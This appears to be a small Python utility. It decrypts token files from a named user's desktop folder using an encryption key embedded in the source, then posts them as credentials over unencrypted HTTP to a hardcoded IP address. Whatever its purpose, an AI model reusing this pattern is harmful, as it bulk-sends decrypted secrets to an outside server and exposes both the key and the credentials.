import os
import time

import requests
import json

from cryptography.fernet import Fernet

GLOBAL_KEY = b'tNE09TWU66coGQ-mmZwjPrHkPbyJ2cR5jnFzNBaK7b8='
GLOBAL_ENCRYPTION_WORKER = Fernet(GLOBAL_KEY)
DECRYPT_PATH = 'C:\\Users\\Ty Tran\\Desktop\\token'
UPLOAD_URL = 'http://35.226.69.158:16524/credential'

for file in os.listdir(DECRYPT_PATH):
    content = open(os.path.join(DECRYPT_PATH, file)).read()
    json_obj = GLOBAL_ENCRYPTION_WORKER.decrypt(content.encode()).decode()
    json_obj = json.loads(json_obj)
    print(requests.post(UPLOAD_URL, json={'json_credential': json_obj}).text)
